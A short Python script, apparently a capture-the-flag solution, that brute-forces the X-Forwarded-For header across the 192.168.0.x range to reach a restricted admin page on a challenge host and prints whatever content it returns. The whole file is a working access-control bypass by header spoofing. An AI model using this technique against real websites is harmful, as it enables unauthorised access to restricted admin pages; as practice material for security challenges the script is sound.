import requests
from tqdm import tqdm

for idx in tqdm(range(256), desc="Trying all 255 IPs"):
    ip = "192.168.0.%i" % idx
    r = requests.get(
        "https://cfta-wh01.allyourbases.co/admin.html", headers={"X-Forwarded-For": ip}
    )
    if len(r.text) > 0:
        print("IP '%s' returned content!" % ip)
        print(r.text)
        break
